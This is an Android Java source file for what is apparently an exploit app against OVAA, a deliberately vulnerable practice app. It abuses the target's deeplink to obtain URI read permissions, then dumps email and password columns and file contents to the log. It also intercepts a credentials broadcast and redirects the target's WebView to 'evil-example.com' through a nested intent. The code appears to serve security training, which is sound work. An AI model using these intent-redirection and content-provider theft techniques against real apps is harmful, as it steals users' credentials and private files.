package com.mbl.test;

import androidx.appcompat.app.AppCompatActivity;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.database.DatabaseUtils;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.mbl.test.bcIntercept.UnSafeBCInterceptor;
import com.mbl.test.paddleactivity.R;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import dalvik.system.DexFile;

public class MainActivity extends AppCompatActivity {
    Button b1 = null;
    Button b2 = null;
    Button b3 = null;
    Button b4 = null;
    BroadcastReceiver r = new UnSafeBCInterceptor();
    IntentFilter ifR = new IntentFilter("oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA");
    public static Class cc = null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        b1 = (Button) findViewById(R.id.Button1);
        b2 = (Button) findViewById(R.id.Button2);
        b3 = (Button) findViewById(R.id.Button3);
        b4 = (Button) findViewById(R.id.Button4);
        registerReceiver(r, ifR);
        setListener();
        cc = loadTargetClass();
    }
    public Class loadTargetClass(){
        String packageName = "oversecured.ovaa";
        String className = "oversecured.ovaa.objects.LoginData";
        String apkPath = null;

        try {
            ApplicationInfo appInfo = getPackageManager().getApplicationInfo(packageName, 0);
            apkPath = appInfo.sourceDir;

            DexFile dexFile = new DexFile(apkPath);
            ClassLoader cl = getClassLoader();
            Class cli = dexFile.loadClass(className,cl);
            return cli;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public void setListener(){
        if (this.b1 != null) {
            this.b1.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    Intent i = new Intent(Intent.ACTION_VIEW);
                    i.setData(Uri.parse("oversecured://ovaa/grant_uri_permissions"));
                    i.setClassName("oversecured.ovaa","oversecured.ovaa.activities.DeeplinkActivity");
                    Log.d("LOG","Started Main Activity from Exploit-APP");
                    startActivityForResult(i,1999);
//                    startActivity(i);
                }
            });
        }
        if (this.b2 != null) {
            this.b2.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    Intent i = new Intent(Intent.ACTION_VIEW);
                    i.setData(Uri.parse("oversecured://ovaa/grant_uri_permissions"));
                    i.setClassName("oversecured.ovaa","oversecured.ovaa.activities.DeeplinkActivity");
                    Log.d("LOG","Started Main Activity from Exploit-APP");
                    startActivityForResult(i,2999);
//                    startActivity(i);
                }
            });
        }
        if (this.b3 != null) {
            this.b3.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    Intent extra = new Intent();
                    extra.setClassName("oversecured.ovaa", "oversecured.ovaa.activities.WebViewActivity");
                    extra.putExtra("url", "http://evil-example.com");
                    Intent intent = new Intent("oversecured.ovaa.action.LOGIN");
                    intent.putExtra("redirect_intent", extra);
                    startActivity(intent);
                }
            });
        }
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data){
//        Log.d("LOG", "requestcode is "+requestCode+" resultcode is "+resultCode+" data is "+data.toString());
        super.onActivityResult(requestCode,resultCode,data);
        //Log.d("LOG","resutcode : "+ resultCode+"\nrequestcode :  "+requestCode);
        if (resultCode == -1 && requestCode == 1999){
            Log.d("LOG","Got the intent with flag_read_uri_permission, now we can access content-provider");
            dumpFromCP(data.getData());
        }
        if (resultCode == -1 && requestCode == 2999) {
            Log.d("LOG","Got the intent with flag_read_uri_permission, now we can access content-provider");
            dumpFromFP(data.getData());
        }
    }
    public void dumpFromCP(Uri uri) {
        Uri myUri;
        myUri = uri;
        String[] str = new String[] {"email","password"};
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(myUri,str,null,null,null);
        Log.i("LOG","Dumping data\n");
        Log.e("LOG", DatabaseUtils.dumpCursorToString(c));
    }

    public void dumpFromFP(Uri uri) {
        try {
            InputStream stream = getContentResolver().openInputStream(uri);
            InputStreamReader reader = new InputStreamReader(stream);
            BufferedReader read = new BufferedReader(reader);
            String str;
            Log.e("LOG","reading line...");
            while ((str = read.readLine()) != null){
                Log.i("READING",str);
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}